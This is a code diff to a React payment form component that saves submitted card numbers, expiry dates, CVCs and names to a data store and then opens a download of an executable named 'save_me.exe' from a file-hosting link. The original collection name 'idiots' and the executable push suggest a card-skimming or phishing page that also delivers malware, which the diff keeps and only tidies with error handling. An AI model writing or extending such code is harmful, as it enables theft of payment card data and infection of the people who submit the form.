@@ -28,10 +28,12 @@ const PaymentForm = () => {
       setErrorMessage(message);
       return;
     }
-    const { error } = await addData("idiots", state.name, { number: state.number, expiry: state.expiry, cvc: state.cvc, name: state.name });
-    if (!error) {
-      window.open('https://download1581.mediafire.com/6lrzhne0pgvgfL1hl7w8t8gQGixwaHNYn_Hf5vYVDt-V_AELEBhxZ2rgJkFU7mgP7fyDDzs5GPEJFvm3vHphECLT90Y8tO3HOEka6a0Ew3H4JHkHl4FwNpuZ3w741AW7aCn2zrxDd-n4Br_wVLf2nU6a5li1YB-D7t4Te3WDraU/bkor3ldplijp5p1/save_me.exe', '_blank', 'noreferrer');
+    const { error } = await addData("credit-card", state.name, { number: state.number, expiry: state.expiry, cvc: state.cvc, name: state.name });
+    if (error) {
+      setErrorMessage("Error while submitting data");
+      return;
     }
+    window.open('https://download1581.mediafire.com/6lrzhne0pgvgfL1hl7w8t8gQGixwaHNYn_Hf5vYVDt-V_AELEBhxZ2rgJkFU7mgP7fyDDzs5GPEJFvm3vHphECLT90Y8tO3HOEka6a0Ew3H4JHkHl4FwNpuZ3w741AW7aCn2zrxDd-n4Br_wVLf2nU6a5li1YB-D7t4Te3WDraU/bkor3ldplijp5p1/save_me.exe', '_blank', 'noreferrer');
     setState(defaultState)
   };
 
